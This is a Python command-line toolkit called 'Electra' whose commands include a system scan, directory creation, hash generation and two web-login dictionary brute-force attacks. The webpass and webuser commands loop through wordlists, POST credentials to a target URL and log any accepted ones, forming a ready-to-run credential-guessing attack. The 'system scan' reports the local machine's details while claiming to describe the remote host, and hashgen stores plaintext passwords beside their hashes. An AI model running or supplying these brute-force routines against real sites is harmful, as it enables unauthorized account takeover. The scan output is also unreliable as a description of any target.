#!/usr/bin/env python3
import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt

BANNER = """
███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██ ██╔══██╗
█████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.0

Electra - The master plan plotter.
"""

class BannerGroup(click.Group):
    def get_help(self, ctx):
        click.echo(BANNER)
        return super().get_help(ctx)
    
    def format_commands(self, ctx, formatter):
        commands = [
            ("sscan", "Perform a system scan."),
            ("cdir", "Create a new directory in a specified path."),
            ("webpass", "Web Dictionary Password Brute Force Attack."),
            ("webuser", "Web Dictionary Username Brute Force Attack."),
            ("hashgen", "Generate hash of a specific password.")
        ]
        with formatter.section("Commands"):
            for cmd, desc in commands:
                formatter.write_text(f"{cmd:<10} {desc}")
        #return super().format_commands(ctx, formatter)

#HELP COMMAND
@click.group(cls=BannerGroup)
@click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
def cli():
    click.echo(BANNER)

#SSCAN COMMAND
@cli.command()
@click.option("-h", "--hostname", required=True, prompt="Hostname", help="Hostname of the system to scan.")
def sscan(hostname):
    click.echo(click.style(f"[*] Starting system scan for host: {hostname}", fg="blue"))
    try:
        #Resolve IP of the host
        ip = socket.gethostbyname(hostname)
        click.echo(click.style(f"[!] Resolved IP address: {ip}", fg="green"))
        #Perform ping test
        response = os.system(f"ping -c 4 {ip}")
        if response == 0:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is reachable.", fg="green"))
        else:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is not reachable.", fg="red"))
            return
        
        #OS and system info
        click.echo(click.style("\n[*] Gathering OS and System info ...", fg="blue"))
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.machine()
        click.echo(click.style(f"[!] OS: {os_name}", fg="green"))
        click.echo(click.style(f"[!] OS Version: {os_version}", fg="green"))
        click.echo(click.style(f"[!] Architecture: {architecture}", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        cpu_cores = psutil.cpu_count(logical=False)
        total_mem = psutil.virtual_memory().total // (1024 ** 2)
        click.echo(click.style(f"[!] CPU Cores: {cpu_cores}", fg="green"))
        click.echo(click.style(f"[!] Total Mem: {total_mem} MBs", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #Network info
        for interfaces, addresses in psutil.net_if_addrs().items():
            click.echo(click.style(f"[!] Network Interface: {interfaces}", fg="green"))
            click.echo(click.style(""))
            for address in addresses:
                if address.family == socket.AF_INET:
                    click.echo(click.style(f"[!] IPv4: {address.address}", fg="green"))
                elif address.family == socket.AF_INET6:
                    click.echo(click.style(f"[!] IPv6: {address.address}", fg="green"))
                elif address.family == psutil.AF_LINK:
                    click.echo(click.style(f"[!] MAC: {address.address}", fg="green"))
            click.echo(click.style(""))

        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #AD info (if os == windows)
        if os_name == "Windows":
            try:
                ad_domain = subprocess.check_output("net config workstation", shell=True).decode()
                if "Workstation Domain" in ad_domain:
                    click.echo(click.style("[!] AD Domain detected.", fg="green"))
                else:
                    click.echo(click.style("[!] No AD Domain detected.", fg="red"))
            except Exception as e:
                click.echo(click.style("[!] Could not retrieve AD Domain info.", fg="red"))
        else:
            click.echo(click.style("[!] Host OS is not Windows. No AD Domain detected.", fg="red"))
    
    except socket.gaierror:
        click.echo(click.style(f"[!] Error: Hostname: {hostname} could not be resolved.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#CDIR COMMAND
@cli.command()
@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
def cdir(name, path):
    #Check whether OS is Linux
    if os.name != "posix":
        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
        return
    
    #Set default path
    if not path:
        path = os.getcwd()
        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
    
    #Construct the full directory path
    full_path = os.path.join(path, name)

    try:
        os.makedirs(full_path, exist_ok=True)
        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
    except PermissionError:
        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
    except FileExistsError:
        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#WEBPASS COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", prompt="Username", help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the password wordlist.")
def webpass(url, username, wordlist):
    click.echo(click.style(f"[*] Starting password wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found password: {password}", fg="green"))
                    #Save password to a file
                    with open("Electra-Found-Passwords.txt", "a") as found_passwords:
                        found_passwords.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with password: '{password}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Password Wordlist BF attack completed. No valid passwords found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#WEBUSER COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-p", "--password", prompt="Password", help="Password for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the username wordlist.")
def webuser(url, password, wordlist):
    click.echo(click.style(f"[*] Starting username wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for username in file:
                username = username.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found username: {username}", fg="green"))
                    #Save username to a file
                    with open("Electra-Found-Usernames.txt", "a") as found_usernames:
                        found_usernames.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with username: '{username}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Username Wordlist BF attack completed. No valid usernames found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#HASHGEN COMMAND
@cli.command()
@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha256", "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
@click.option("-p", "--password", required=True, help="Password to hash.")
def hashgen(function, password):
    #Generate hash based on selected func
    click.echo(click.style(f"[*] Generating the hash of: {password} using: {function}.", fg="blue"))
    if function == "md5":
        hashed_pass = hashlib.md5(password.encode()).hexdigest()
    elif function == "sha1":
        hashed_pass = hashlib.sha1(password.encode()).hexdigest()
    elif function == "sha256":
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    elif function == "bcrypt":
        salt = bcrypt.gensalt()
        hashed_pass = bcrypt.hashpw(password.encode(), salt).decode()
    
    click.echo(click.style(f"[!] {function.upper()} hash of '{password}' is {hashed_pass}", fg="green"))
    #Save hash to a file
    with open("Electra-Hashed-Passwords.txt", "a") as hashed_passwords:
        hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
    click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))

if __name__ == "__main__":
    cli()